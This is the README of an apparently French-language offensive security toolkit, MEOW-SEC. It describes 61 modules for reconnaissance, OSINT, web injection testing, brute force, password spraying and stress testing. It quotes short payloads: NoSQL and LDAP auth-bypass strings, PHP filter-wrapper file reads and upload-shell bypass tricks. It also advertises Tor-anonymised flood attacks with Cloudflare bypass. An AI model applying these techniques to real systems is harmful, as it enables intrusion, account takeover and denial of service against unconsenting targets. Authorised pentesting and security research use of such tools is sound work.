```
   /\_/\
  ( o.o )  ~ nyaa ~
   > ^ <
  /|   |\
 (_|   |_)
```

<div align="center">

# 🐱 MEOW-SEC

### Cat-Themed Offensive Security Toolkit

**Python 3 · Rich TUI · 61 modules · No BS**

[![Python](https://img.shields.io/badge/Python-3.10+-brightgreen?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue?style=for-the-badge)](.)
[![Modules](https://img.shields.io/badge/Modules-61-brightgreen?style=for-the-badge)](.)
[![Version](https://img.shields.io/badge/Version-1.5-orange?style=for-the-badge)](.)
[![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge)](.)
[![Proxy](https://img.shields.io/badge/Proxy-Auto--Rotate-yellow?style=for-the-badge)](.)
[![CF Bypass](https://img.shields.io/badge/Cloudflare-JA3%20Bypass-purple?style=for-the-badge)](.)

*by cat-project-hat // 2026*

</div>

---

## ⚠️ Avertissement légal

> **Ce projet est strictement éducatif.** Réservé aux **CTF**, **tests d'intrusion avec autorisation écrite** et **recherche en sécurité**. L'utilisation sur des systèmes tiers sans permission explicite est **illégale** dans toutes les juridictions. Les auteurs déclinent toute responsabilité. **Use responsibly. Stay legal.**

---

## 🧠 C'est quoi MEOW-SEC ?

MEOW-SEC est un toolkit offensif tout-en-un conçu pour les pentesters, chasseurs de bugs, participants CTF et chercheurs en sécurité. Il regroupe dans une seule interface Rich TUI toutes les phases d'un test d'intrusion typique :

```
Phase 1 — Reconnaissance  →  comprendre la cible avant d'attaquer
Phase 2 — Exploitation    →  trouver et exploiter les vulnérabilités web
Phase 3 — Post-Exploit    →  maintenir l'accès, extraire des données
Phase 4 — Red Team        →  phishing, social engineering, spoofing
Phase 5 — Reporting       →  générer des rapports propres pour le client
```

Tout fonctionne sans configuration. Les proxies se téléchargent automatiquement, les dépendances s'installent seules, et chaque module peut être lancé directement depuis la CLI.

---

## 🚀 Installation & démarrage

```bash
# Copier le dossier
cd meow-sec

# Lancer (les dépendances s'installent automatiquement)
python meow.py

# Lancer un module directement sans passer par le menu
python meow.py sqli
python meow.py wpscan
python meow.py iplookup
python meow.py urlspoof
```

**Requirements** (installés automatiquement) :
```
rich>=13.7.0       ← interface TUI dans le terminal
colorama>=0.4.6    ← couleurs sur Windows
requests>=2.31.0   ← requêtes HTTP
PySocks>=1.7.1     ← support proxies SOCKS4/SOCKS5
curl_cffi          ← [optionnel] bypass Cloudflare / JA3 fingerprint
stem               ← [optionnel] Tor circuit renewal pour SPECTER
```

---

## 🗂️ Structure

```
meow-sec/
├── meow.py              ← point d'entrée : menu interactif + dispatch CLI
├── meow.bat             ← lanceur Windows (double-clic)
├── requirements.txt
│
├── core/
│   ├── ui.py            ← tout l'affichage Rich : bannière, menus, helpers ok/err/warn/find
│   ├── cats.py          ← ASCII art, animations, typewriter effect
│   ├── proxy_manager.py ← téléchargement + validation + rotation automatique des proxies
│   └── tunnel.py        ← gestionnaire de tunnels publics (cloudflared / serveo / bore...)
│
├── data/                ← tous les résultats JSON et logs sont sauvegardés ici
│
└── modules/             ← 61 modules, un fichier = un outil
```

---

## 📋 Référence complète des modules

> Chaque module est décrit avec : **ce qu'il fait**, **quand l'utiliser**, et **ce qu'il retourne**.

---

### 🔍 RECONNAISSANCE — Cartographier la cible

La reconnaissance est la première étape de tout pentest. On collecte un maximum d'informations sur la cible **sans l'attaquer directement** : ports ouverts, technologies utilisées, sous-domaines, emails, identités, historique. Plus on en sait, plus l'attaque sera précise.

---

#### `[1]` CLAW — Port & Service Scanner
**Ce qu'il fait** : Scanne les ports TCP d'une cible, tente un banner grab sur chaque port ouvert et identifie le service (HTTP, SSH, FTP, MySQL...).

**Quand l'utiliser** : En tout début de pentest pour savoir quels services sont exposés. Un port 3306 ouvert = MySQL accessible depuis l'extérieur. Un port 8080 = panel admin probable. Un port 22 = SSH à tester avec brute force.

**Retourne** : Liste des ports ouverts avec service détecté et bannière brute.

---

#### `[2]` PURR — HTTP Recon & Header Analyzer
**Ce qu'il fait** : Envoie une requête HTTP à la cible et analyse la réponse en profondeur — headers de sécurité (CSP, HSTS, X-Frame-Options), technologies détectées (X-Powered-By, Server), cookies (HttpOnly, Secure, SameSite), et scanne une liste de chemins courants.

**Quand l'utiliser** : Sur n'importe quel serveur web pour un premier bilan rapide. Révèle immédiatement des failles low-hanging fruit comme l'absence de CSP, des cookies sans HttpOnly, ou la version de PHP/Apache exposée dans les headers.

**Retourne** : Rapport détaillé des headers, technologies, et chemins trouvés.

---

#### `[3]` SCRATCH — Directory Brute Force
**Ce qu'il fait** : Teste une wordlist de chemins sur un serveur web (`/admin`, `/backup`, `/.git`, `/api/v1`...) avec détection de soft-404 pour éviter les faux positifs.

**Quand l'utiliser** : Après PURR, pour découvrir des endpoints cachés, des panels admin non référencés, des fichiers de backup oubliés, ou des APIs non documentées. Indispensable sur les cibles avec beaucoup de contenu.

**Retourne** : Liste de chemins existants avec code HTTP et taille de réponse.

---

#### `[4]` WHISKER — DNS / WHOIS / GeoIP / AXFR
**Ce qu'il fait** : Collecte tous les enregistrements DNS (A, MX, TXT, NS, CNAME, AAAA), fait un WHOIS pour obtenir le propriétaire du domaine et les dates d'expiration, géolocalise l'IP, tente un transfert de zone DNS (AXFR), et interroge crt.sh pour trouver des sous-domaines via les certificats SSL publics.

**Quand l'utiliser** : Sur le domaine principal de la cible pour cartographier toute l'infrastructure. L'AXFR révèle parfois toute la liste des sous-domaines en une seule requête si le DNS est mal configuré. Les enregistrements TXT contiennent SPF, DMARC, et parfois des tokens de vérification de services tiers.

**Retourne** : Tous les records DNS, infos WHOIS, résultats crt.sh, résultat AXFR.

---

#### `[6]` CATNAP — Subdomain Enumerator
**Ce qu'il fait** : Énumère les sous-domaines d'un domaine en combinant résolution DNS brute-force et vérification HTTP pour confirmer que le sous-domaine répond.

**Quand l'utiliser** : Quand WHISKER n'a pas suffi à trouver tous les sous-domaines. Chaque sous-domaine est une surface d'attaque supplémentaire — `staging.company.com` a souvent moins de sécurité que `www.company.com`.

**Retourne** : Liste de sous-domaines résolus avec IP et status HTTP.

---

#### `[9]` GHOST — Username OSINT
**Ce qu'il fait** : Prend un pseudonyme et vérifie sa présence sur 30+ plateformes (GitHub, Twitter/X, Instagram, Reddit, HackerNews, Steam, TikTok, LinkedIn...) via des requêtes HTTP parallèles.

**Quand l'utiliser** : Pour profiler une cible humaine dans un contexte de red team ou d'investigation. Trouver les comptes d'un individu permet de collecter des informations publiques, de trouver des emails, ou d'identifier des centres d'intérêt utiles pour le phishing ciblé (spear phishing).

**Retourne** : URLs des profils trouvés par plateforme.

---

#### `[10]` OSINT+ — Email / Phone / IP / Dorks
**Ce qu'il fait** : Module OSINT étendu couvrant plusieurs angles — recherche d'informations sur une adresse email (domaine, format, validation), un numéro de téléphone, une IP, ou génération de Google Dorks ciblés pour trouver des fichiers sensibles indexés.

**Quand l'utiliser** : Pour approfondir un profil après GHOST, ou pour générer des dorks du style `site:company.com filetype:pdf "confidential"` qui trouvent des documents internes mal protégés indexés par Google.

**Retourne** : Informations collectées + liens dorks prêts à coller dans Google.

---

#### `[18]` WAF — WAF / CDN Fingerprinting
**Ce qu'il fait** : Envoie des requêtes spécifiques et analyse les réponses pour identifier si la cible est protégée par un WAF (Cloudflare, Akamai, AWS WAF, Imperva, Sucuri, F5...) et quel CDN est utilisé.

**Quand l'utiliser** : Avant de lancer des attaques actives. Si un Cloudflare est en place, les payloads SQLi/XSS basiques seront bloqués et il faudra utiliser des techniques de bypass. Si aucun WAF n'est détecté, les tests peuvent être plus directs.

**Retourne** : Nom du WAF/CDN détecté et niveau de confiance.

---

#### `[28]` CVE — CVE Lookup & Version Matcher
**Ce qu'il fait** : Interroge les bases NVD (NIST) et CIRCL.lu pour chercher des CVEs associés à un produit/version. Peut aussi auto-détecter la version d'une cible et matcher les CVEs correspondants.

**Quand l'utiliser** : Quand PURR ou CLAW a révélé une version précise (Apache 2.4.49, OpenSSH 7.4, WordPress 5.8...). Chercher les CVEs connues permet de vérifier rapidement si la cible est vulnérable à des exploits publics.

**Retourne** : Liste de CVEs avec score CVSS, description et liens.

---

#### `[29]` HARVEST — Email Harvester
**Ce qu'il fait** : Collecte des adresses email associées à un domaine depuis plusieurs sources : crt.sh (certificats SSL), archive.org (pages archivées), GitHub (dépôts publics), et scraping de la page web. Génère aussi des patterns d'emails courants (`prenom.nom@domain.com`).

**Quand l'utiliser** : Pour constituer une liste de cibles pour du password spraying, du phishing, ou pour identifier des employés dans le cadre d'un audit social engineering. Souvent très productif sur les entreprises avec beaucoup de présence web.

**Retourne** : Liste d'emails uniques trouvés + patterns générés.

---

#### `[30]` TAKEOVER — Subdomain Takeover
**Ce qu'il fait** : Vérifie si des sous-domaines pointent vers des services tiers (GitHub Pages, Heroku, AWS S3, Vercel, Netlify, Fastly, Shopify...) qui ont été supprimés — laissant le DNS pointer dans le vide. Dans ce cas, un attaquant peut réenregistrer le service et "prendre le contrôle" du sous-domaine.

**Quand l'utiliser** : Sur des cibles avec beaucoup de sous-domaines, surtout des startups ou grandes entreprises qui ont eu du turnover de services. Un subdomain takeover peut permettre de servir du contenu sous le domaine légitime de la cible — phishing parfait ou vol de cookies.

**Retourne** : Sous-domaines vulnérables avec le service concerné.

---

#### `[37]` GITDUMP — Git & Sensitive File Scanner
**Ce qu'il fait** : Vérifie si un dépôt `.git/` est accessible publiquement sur le serveur web, tente de réconstruire le code source, et scanne 50+ chemins de fichiers sensibles (`.env`, `config.php`, `database.yml`, clés privées SSH, backups SQL...).

**Quand l'utiliser** : Sur n'importe quel serveur web. Un `.git` exposé est une fuite catastrophique — on peut extraire tout le code source, les credentials de base de données, les clés API. Les fichiers `.env` contiennent souvent des mots de passe en clair.

**Retourne** : Fichiers trouvés avec contenu partiel, URLs des objets git récupérés.

---

#### `[39]` SECRETSCAN — Secret / Credential Scanner
**Ce qu'il fait** : Crawle un site web et analyse le contenu des pages HTML et JavaScript avec 15 expressions régulières ciblant des secrets — clés AWS (`AKIA...`), tokens GitHub, clés privées PEM, URLs de bases de données avec mot de passe, tokens JWT, clés Stripe, webhooks Slack...

**Quand l'utiliser** : Sur les applications web modernes qui bundlent leur JavaScript. Il arrive fréquemment que des développeurs laissent des clés API dans le frontend ou dans des fichiers JS non minifiés. Aussi utile sur des fichiers de config exposés.

**Retourne** : Secrets trouvés avec le pattern matché et la valeur tronquée.

---

#### `[44]` BREACH — Data Breach Checker
**Ce qu'il fait** : Vérifie si un mot de passe a été compromis via l'API HIBP (Have I Been Pwned) en k-anonymité — seuls les 5 premiers caractères du hash SHA1 sont envoyés, jamais le mot de passe complet. Peut aussi vérifier une adresse email.

**Quand l'utiliser** : Pour tester si les mots de passe récupérés lors d'un audit ont déjà fuité, ou pour démontrer à un client que ses employés réutilisent des mots de passe compromis. La k-anonymité garantit que le mot de passe n'est jamais exposé à HIBP.

**Retourne** : Nombre de fois où le mot de passe a été trouvé dans des leaks.

---

#### `[45]` SHODAN — Shodan-Lite IP Recon
**Ce qu'il fait** : Interroge l'API publique `internetdb.shodan.io` (sans clé) pour obtenir les ports ouverts, CPEs (logiciels identifiés), hostnames, tags (honeypot, VPN, CDN) et CVEs associés à une IP. Supporte le scan CIDR /24 en parallèle.

**Quand l'utiliser** : Pour une vue rapide de ce que Shodan sait d'une IP ou d'un range réseau, sans créer de compte. Idéal en phase de recon passive pour savoir quels services sont visibles depuis internet sur une infrastructure cible.

**Retourne** : Ports, services, CVEs et tags Shodan par IP.

---

#### `[60]` IPLOOKUP — IP / Domain Intelligence
**Ce qu'il fait** : Agrège des données de plusieurs sources sur une IP ou un domaine — géolocalisation précise (pays, ville, coordonnées GPS), ASN et organisation, données Shodan (ports/CVEs), score d'abus AbuseIPDB, WHOIS via RDAP, reverse DNS. Génère un lien Google Maps direct. Supporte le scan CIDR et le batch depuis fichier.

**Quand l'utiliser** : Pour investiguer une IP suspecte dans des logs, tracer l'origine d'une attaque, ou enrichir un rapport client avec des données de contexte sur les IPs trouvées. Aussi utile pour vérifier si l'IP d'une cible est derrière un CDN/proxy avant de lancer des tests.

**Retourne** : Rapport complet GeoIP + ASN + Shodan + AbuseIPDB + RDAP + coordonnées.

---

#### `[61]` PHONELOOKUP — Phone Number OSINT
**Ce qu'il fait** : Normalise n'importe quel format de numéro en E.164, identifie le pays et les opérateurs connus, détermine le type de ligne (mobile/fixe/numéro spécial) avec des heuristiques par pays (France, UK, Allemagne, Inde, Chine...), tente un HLR lookup et génère 10 liens OSINT directs (Truecaller, WhatsApp, Telegram, SpyDialer...).

**Quand l'utiliser** : Pour identifier l'origine d'un numéro inconnu dans un contexte OSINT, vérifier si un numéro reçu en pentest social est légitime, ou constituer un dossier OSINT sur un individu en partant d'un numéro de téléphone.

**Retourne** : Pays, opérateur, type de ligne, résultats HLR, liens OSINT ouverts.

---

### 💉 EXPLOIT — Tester les vulnérabilités web

L'exploitation web couvre toutes les vulnérabilités d'application : injection dans les requêtes SQL, commandes OS, templates, LDAP, NoSQL, ORM... mais aussi les failles de logique comme IDOR, race condition, upload, et les mauvaises configurations OAuth, CORS, cache.

---

#### `[5]` HISS — Multi-Injection Tester
**Ce qu'il fait** : Swiss-knife des injections web — teste SQLi, XSS reflected, SSRF, CRLF injection, open redirect et Host Header injection sur une cible. Peut aussi crawler les formulaires d'une page et les tester automatiquement.

**Quand l'utiliser** : Pour un premier passage rapide sur une cible inconnue. HISS donne une vue d'ensemble en quelques minutes. Si quelque chose est détecté, utiliser les modules dédiés (SQLI, CMDI...) pour aller plus loin.

**Retourne** : Vulnérabilités détectées avec payloads et réponses.

---

#### `[47]` SQLI — SQL Injection Avancé
**Ce qu'il fait** : Testeur SQLi multi-techniques pour 7 bases de données (MySQL, MariaDB, PostgreSQL, MSSQL, Oracle, SQLite, Generic). Couvre 4 méthodes : **error-based** (signatures d'erreur par DB), **boolean-blind** (comparaison de réponses), **time-based blind** (mesure du délai SLEEP/WAITFOR), et **UNION-based** (détection automatique du nombre de colonnes). Une fois une DB identifiée, extrait version, utilisateur, base courante et liste des tables.

**Quand l'utiliser** : Dès que HISS ou FUZZ signale un potentiel SQLi, ou directement sur des paramètres suspects dans des apps CRUD (GET `?id=`, POST form avec `search=`). MariaDB est traité séparément avec ses signatures spécifiques (`er_parse_error`, `com.mariadb.jdbc`).

**Retourne** : DB détectée, méthode confirmée, données extraites (version/user/tables).

---

#### `[48]` CMDI — OS Command Injection
**Ce qu'il fait** : Teste si des paramètres HTTP sont vulnérables à l'injection de commandes OS. Deux modes : **verbose** (cherche des marqueurs dans la réponse comme `uid=`, `root`, `NT AUTHORITY`) et **blind time-based** (mesure le délai d'un `sleep 4` Linux ou `ping -n 5` Windows). Teste aussi les headers HTTP (User-Agent, Referer, X-Forwarded-For) qui sont parfois loggés et exécutés.

**Quand l'utiliser** : Sur les endpoints qui semblent appeler des commandes système — convertisseurs de fichiers, ping/traceroute en ligne, génération de PDF, traitement d'images. Aussi sur les paramètres qui contiennent des noms de fichiers ou des chemins.

**Retourne** : Paramètre vulnérable, commande injectée, sortie capturée (si verbose).

---

#### `[49]` NOSQLI — NoSQL Injection
**Ce qu'il fait** : Teste les injections NoSQL pour MongoDB, Redis et CouchDB. Injecte des opérateurs MongoDB (`$ne`, `$gt`, `$regex`, `$where`) dans les paramètres GET et en JSON body pour bypasser l'authentification ou extraire des données. Teste aussi la confusion de type array et le JavaScript `$where` en time-based.

**Quand l'utiliser** : Sur des apps Node.js/Express avec MongoDB, ou toute app avec des erreurs qui mentionnent Mongoose, MongoDB ou des opérateurs `$`. L'injection `{"username": {"$ne": null}, "password": {"$ne": null}}` bypass souvent les logins MongoDB non protégés.

**Retourne** : Opérateurs injectés avec succès, différences de réponse détectées.

---

#### `[50]` ORMI — ORM Injection
**Ce qu'il fait** : Teste les injections dans les couches ORM — TypeORM (Node.js/TypeScript), Hibernate/HQL, JPQL, LINQ (.NET), Django ORM, Eloquent (Laravel), ActiveRecord (Rails), Sequelize. TypeORM a ses propres fonctions dédiées : injection dans `QueryBuilder.where()`, `orderBy(userInput)`, et bypass des `find()` avec des objets FindOperator internes.

**Quand l'utiliser** : Sur des APIs REST qui utilisent des ORMs. Contrairement à SQLi classique, les ORMs ont leurs propres patterns — par exemple TypeORM accepte `{"_type": "moreThan", "_value": 0}` dans un champ `find()`, ce qui bypass les vérifications d'accès. Très pertinent sur des apps NestJS/TypeORM.

**Retourne** : Framework détecté, vecteur d'injection confirmé, payload efficace.

---

#### `[25]` CORS — CORS Misconfiguration
**Ce qu'il fait** : Teste une dizaine d'origines malveillantes (wildcard, null, sous-domaine attaquant, HTTP downgrade...) pour identifier si le serveur reflète une origine contrôlée par l'attaquant avec `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials: true`.

**Quand l'utiliser** : Sur toutes les APIs web, surtout celles qui utilisent des cookies de session. Une CORS mal configurée permet à un site malveillant de faire des requêtes authentifiées en cross-origin et de voler les données — c'est un vol de session silencieux.

**Retourne** : Origines acceptées, présence de `credentials: true`, sévérité.

---

#### `[26]` LFI — Local / Remote File Inclusion
**Ce qu'il fait** : Teste les paramètres suspects pour Local File Inclusion (lire `/etc/passwd`, `win.ini`, fichiers de config) et Remote File Inclusion. Utilise path traversal (`../../../`), double-encoding (`%2e%2e/`), et wrappers PHP (`php://filter/convert.base64-encode/resource=index.php`) pour extraire le code source.

**Quand l'utiliser** : Sur les paramètres qui ressemblent à des chemins de fichiers (`?page=`, `?file=`, `?template=`, `?lang=`). Sur PHP en particulier, LFI + wrappers permet de lire le code source de l'appli entière, révélant des credentials hardcodés.

**Retourne** : Chemins exploitables, contenu des fichiers extraits.

---

#### `[27]` FUZZ — Parameter & Endpoint Fuzzer
**Ce qu'il fait** : Découverte automatique de paramètres cachés, endpoints non documentés, et valeurs inattendues. Teste des listes de noms de paramètres courants, des chemins d'API standards, et peut injecter des valeurs de fuzzing dans des paramètres existants.

**Quand l'utiliser** : Quand une app semble avoir plus de fonctionnalités que ce qui est exposé, ou pour découvrir des paramètres cachés comme `?debug=1`, `?admin=true`, `?internal=1` qui activent des comportements non documentés.

**Retourne** : Paramètres/endpoints qui provoquent des réponses différentes du baseline.

---

#### `[35]` SMUGGLE — HTTP Request Smuggling
**Ce qu'il fait** : Utilise des raw sockets (bypass complet de la couche HTTP requests) pour envoyer des requêtes précisément malformées testant les 3 variantes de smuggling : **CL.TE** (Content-Length vs Transfer-Encoding), **TE.CL** (Transfer-Encoding prioritaire), **TE.TE** (5 formes d'obfuscation du header TE).

**Quand l'utiliser** : Sur des architectures avec un reverse proxy (nginx, HAProxy, Cloudflare) devant un backend applicatif. Le smuggling exploite les divergences d'interprétation HTTP entre les deux couches — peut permettre de bypasser des contrôles de sécurité, voler des requêtes d'autres utilisateurs, ou obtenir un accès admin.

**Retourne** : Variante de smuggling détectée, delta de temps ou réponse anormale.

---

#### `[36]` XXE — XML External Entity
**Ce qu'il fait** : Teste 10 payloads XXE sur les endpoints qui consomment du XML (`application/xml`, `text/xml`). Couvre lecture de fichiers locaux (`/etc/passwd`), SSRF vers métadonnées cloud, blind OOB avec callback URL configurable, error-based, CDATA exfil, XXE dans SVG, et SOAP XXE.

**Quand l'utiliser** : Sur les APIs SOAP, les parseurs XML (upload de fichiers XML/SVG/DOCX), et les endpoints qui acceptent du contenu structuré. Les apps Java avec des librairies XML anciennes (Xerces) sont souvent vulnérables par défaut.

**Retourne** : Payload efficace, contenu extrait, callback reçu.

---

#### `[38]` SSTI — Server-Side Template Injection
**Ce qu'il fait** : Teste 10 payloads de détection mathématiques (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`) sur des paramètres GET, POST form, JSON, et segments de chemin. Identifie l'engine de template par la valeur retournée (49 = Jinja2/Twig, 7777777 = Mako, "A...A" = FreeMarker) et propose les payloads RCE correspondants.

**Quand l'utiliser** : Sur les apps qui affichent des données utilisateur dans des templates — notamment les apps Python (Flask/Django/Jinja2), Ruby (ERB), Java (FreeMarker, Velocity), Node.js (Pug, Handlebars). SSTI peut mener à RCE complète.

**Retourne** : Engine détecté, valeur retournée, payloads RCE suggérés.

---

#### `[40]` CACHE — Web Cache Poisoning
**Ce qu'il fait** : Teste 10 headers non-keyés (X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, Fat GET...) pour identifier si le cache du serveur peut être empoisonné. Compare le status et la taille de chaque réponse avec le baseline pour détecter si un header altère le contenu mis en cache. Teste aussi le cache deception (extensions statiques fake sur des chemins protégés).

**Quand l'utiliser** : Sur des apps avec du cache (Varnish, Cloudflare, Fastly, nginx proxy_cache). Un cache poisoning réussi permet de servir du contenu malveillant à tous les visiteurs suivants — vol de cookies, XSS stocké via le cache, déni de service.

**Retourne** : Headers qui altèrent la réponse, différences détectées.

---

#### `[41]` OAUTH — OAuth 2.0 / OIDC Misconfiguration
**Ce qu'il fait** : Découverte automatique via `.well-known/openid-configuration`, puis teste 7 failles : `redirect_uri` open redirect, absence de validation `state` (CSRF), implicit flow activé, PKCE manquant, `client_secret` exposé dans le JavaScript frontend, token endpoint accessible en GET, et scope trop large.

**Quand l'utiliser** : Sur toutes les apps avec "Login with Google/GitHub/Facebook". Une `redirect_uri` sans validation stricte permet de voler le code d'autorisation. Un `state` non validé permet du CSRF. Un `client_secret` côté client = compromission totale du flux OAuth.

**Retourne** : Failles détectées avec description et impact.

---

#### `[42]` DESERIA — Deserialization Tester
**Ce qu'il fait** : Teste les vulnérabilités de désérialisation pour PHP (magic bytes `O:8:`), Java (magic bytes `AC ED 00 05`), Python pickle (magic `\x80\x04`), et Node.js (pattern `_$$ND_FUNC$$_` de node-serialize). Envoie des payloads dans les cookies, headers et body JSON.

**Quand l'utiliser** : Sur les apps qui stockent des objets sérialisés dans les cookies ou les paramètres (souvent visible à l'oeil nu — base64 avec `O:8:` décodé = objet PHP sérialisé). Les apps Java avec des librairies anciennes (Commons Collections) sont particulièrement vulnérables.

**Retourne** : Payload ayant provoqué une réponse anormale, stack trace révélatrice.

---

#### `[43]` PROTO — Prototype Pollution
**Ce qu'il fait** : Injecte `__proto__[testprop]=meow_marker` via query string, JSON body, form POST, et segment de chemin URL. Vérifie si le marqueur `meow_polluted_7749` apparaît dans la réponse ou altère le comportement de l'app.

**Quand l'utiliser** : Sur les apps Node.js qui fusionnent des objets user-controlled (`Object.assign`, `lodash.merge`, `_.extend`). La prototype pollution peut bypasser des vérifications d'autorisation (`isAdmin` devient `true` sur tous les objets), causer un RCE dans certains contextes.

**Retourne** : Vecteurs d'injection confirmés, marqueur réfléchi.

---

#### `[53]` IDOR — Insecure Direct Object Reference
**Ce qu'il fait** : Teste l'accès non autorisé à des ressources en manipulant des identifiants. Remplace l'ID de la requête baseline par des variants (±5 voisins séquentiels, UUIDs, `admin`, `0`, `null`...) via path URL, query param, JSON body, et teste 15 patterns de routes REST standards (`/api/users/{id}`, `/api/orders/{id}`...).

**Quand l'utiliser** : Sur toutes les APIs REST. C'est la vulnérabilité numéro 1 en bug bounty. Si une requête `GET /api/users/42` retourne vos données, est-ce que `GET /api/users/41` retourne les données de quelqu'un d'autre ? Nécessite un cookie de session valide pour obtenir un baseline légitime.

**Retourne** : IDs/routes qui retournent des données d'autres utilisateurs.

---

#### `[54]` UPLOAD — File Upload Bypass
**Ce qu'il fait** : Teste 21 techniques de bypass des filtres d'upload de fichiers : double extension (`.php.jpg`), Content-Type spoof (shell PHP avec MIME `image/jpeg`), magic bytes polyglot (GIF89a + shell PHP), `.htaccess` malveillant (exécute les `.jpg` comme PHP), `web.config` IIS, null byte, SVG/HTML XSS, path traversal dans le filename, et shells JSP/ASPX. Tente automatiquement d'accéder au fichier uploadé sur 8+ chemins pour confirmer l'exécution.

**Quand l'utiliser** : Sur tout endpoint d'upload — photos de profil, pièces jointes, imports CSV... Un upload mal filtré peut mener à RCE complète si le serveur exécute les fichiers uploadés.

**Retourne** : Techniques bypassées, chemin du fichier accessible, confirmation RCE/XSS.

---

#### `[55]` RACE — Race Condition
**Ce qu'il fait** : Lance N threads synchronisés via `threading.Barrier` pour qu'ils tirent tous exactement à la même milliseconde sur un endpoint. Pré-chauffe les connexions TCP pour éliminer la latence TLS. Analyse les réponses pour détecter des doubles exécutions (variance de taille, mix 200/409, succès universel). Scénarios préconfigurés : coupon, vote, gift card, reset password, achat, 2FA.

**Quand l'utiliser** : Sur les fonctions "une seule fois" — un coupon ne devrait s'appliquer qu'une fois, un vote qu'une fois, un code 2FA qu'une fois. La fenêtre de race est souvent de quelques millisecondes. La synchronisation par Barrier maximise la probabilité de toucher cette fenêtre.

**Retourne** : Rounds où la race condition a été confirmée, statuts des threads.

---

#### `[56]` LDAPI — LDAP Injection
**Ce qu'il fait** : Teste 15 payloads d'auth bypass LDAP (`*)(uid=*`, `admin)(&`, `*))%00`, variantes hex...) sur des formulaires de login, compare les réponses pour détecter une injection blind, et tente d'énumérer 14 usernames courants (admin, root, ldap, service...) en exploitant le comportement différentiel.

**Quand l'utiliser** : Sur des apps d'entreprise avec authentification centralisée (Active Directory, OpenLDAP) — portails VPN, intranets, apps RH. Les apps Java/PHP qui font des recherches LDAP directement à partir de l'input utilisateur sont souvent vulnérables.

**Retourne** : Payloads bypass confirmés, utilisateurs existants détectés.

---

### 🌐 RÉSEAU & INFRASTRUCTURE

Les outils réseau couvrent les tests sur les couches basses et les services applicatifs — stress test, brute force, scan SSL, détection CMS, cloud storage, protocoles spéciaux.

---

#### `[8]` PROXYCAT — Proxy Manager
**Ce qu'il fait** : Télécharge des proxies HTTP/SOCKS4/SOCKS5 depuis 35+ sources publiques, les valide en parallèle avec 100 workers, conserve le top 30% le plus rapide, et sauvegarde le pool dans `data/proxies.json`. Tous les modules HTTP l'utilisent automatiquement via `proxies=px()`.

**Quand l'utiliser** : En début de session pour constituer un pool de proxies. Indispensable pour anonymiser les tests ou éviter les blocages par IP lors de brute force, fuzzing, ou stress test. Si aucun proxy n'est disponible, les modules passent automatiquement en connexion directe.

---

#### `[15]` NETKIT — Network Utilities
**Ce qu'il fait** : Boîte à outils réseau — ping multi-host, traceroute, WHOIS d'un domaine/IP, et scan CIDR jusqu'à /16 (65536 IPs en parallèle).

**Quand l'utiliser** : Pour vérifier la connectivité, tracer des routes, ou scanner un range réseau interne lors d'un pentest d'infrastructure.

---

#### `[16]` STRESS — Stress Tester (26 méthodes)
**Ce qu'il fait** : Module de stress test L3/L4/L7 avec 26 méthodes différentes. Inclut les méthodes classiques (GET/POST flood, Slowloris, RUDY), des méthodes avancées (H2_CONTINUATION CVE-2024-27316, H2_RST CVE-2023-44487, WebSocket flood), des méthodes anonymisées via Tor/I2P (SPECTER, WRAITH, PHANTOM_MIX), et SWARM (5 méthodes simultanées). Bypass Cloudflare via `curl_cffi` avec empreinte TLS Chrome réelle.

**Quand l'utiliser** : Pour tester la résistance d'une infrastructure à la charge, identifier des limites de rate limiting, ou valider des configurations anti-DDoS dans un contexte de red team autorisé.

---

#### `[21]` BRUTE — HTTP Login Brute Force
**Ce qu'il fait** : Brute force sur des formulaires HTTP avec auto-détection du formulaire (cherche les champs `password` et `username`), support des tokens CSRF (récupère et rejoue automatiquement le token), authentification Basic, et rotation de proxies.

**Quand l'utiliser** : Sur des panels admin, portails VPN, ou tout login HTTP. Toujours commencer avec des wordlists courtes (top 100 passwords) avant d'utiliser des listes longues. Coupler avec HARVEST pour des usernames réalistes.

---

#### `[22]` CMS — CMS Fingerprinting
**Ce qu'il fait** : Identifie le CMS utilisé par une cible parmi 11 frameworks (WordPress, Drupal, Joomla, Laravel, Django, Flask, Symfony, Magento, Ghost, Shopify, PrestaShop) en analysant des chemins caractéristiques, headers, et patterns de code source.

**Quand l'utiliser** : En recon pour savoir si WPSCAN est pertinent, et pour orienter les tests vers les vulnérabilités spécifiques au CMS détecté.

---

#### `[23]` SSLSCAN — SSL/TLS Deep Scanner
**Ce qu'il fait** : Teste les protocoles SSL/TLS supportés (SSLv2, SSLv3, TLS 1.0, 1.1, 1.2, 1.3), les cipher suites acceptées (détecte les suites faibles RC4, 3DES, EXPORT), valide le certificat (expiration, CN, SAN), et analyse les headers de sécurité HTTP. Interroge aussi crt.sh pour les certificats CT.

**Quand l'utiliser** : Sur tout serveur HTTPS. TLS 1.0/1.1 et SSLv3 sont dépréciés et vulnérables (POODLE, BEAST). Un certificat expiré ou un cipher EXPORT signale une infrastructure non maintenue.

---

#### `[31]` BUCKET — Cloud Bucket Finder
**Ce qu'il fait** : Génère 50+ variantes de noms de bucket (préfixes/suffixes `-backup`, `-dev`, `-prod`, `-assets`, `-static`...) et vérifie leur existence et accessibilité publique sur AWS S3, Google Cloud Storage, Azure Blob, et DigitalOcean Spaces.

**Quand l'utiliser** : Sur toutes les cibles qui utilisent des services cloud. Les buckets mal configurés en PUBLIC_READ exposent parfois des backups de base de données, des fichiers de configuration, des images privées, ou du code source.

---

#### `[32]` SPRAY — Password Spraying
**Ce qu'il fait** : Teste un même mot de passe (ou une courte liste) contre de nombreux comptes différents — l'inverse du brute force classique. Supporte HTTP form, authentification Basic, et NTLM. L'objectif est d'éviter les lockouts en ne faisant qu'une tentative par compte.

**Quand l'utiliser** : Quand on a une liste d'emails/usernames (HARVEST) et qu'on veut tester des mots de passe saisonniers (`Automne2024!`, `Company2024`, `Password123`). Très efficace sur Office 365 et les intranets d'entreprise.

---

#### `[33]` GRAPHQL — GraphQL Security Tester
**Ce qu'il fait** : Teste la sécurité d'un endpoint GraphQL — introspection activée (dump du schéma complet), injection dans les queries, test de mutations non autorisées, et détection de batching attack.

**Quand l'utiliser** : Sur toutes les APIs GraphQL modernes. L'introspection activée en production révèle toute l'architecture de l'API. Les mutations non protégées peuvent permettre de modifier des données sans autorisation.

---

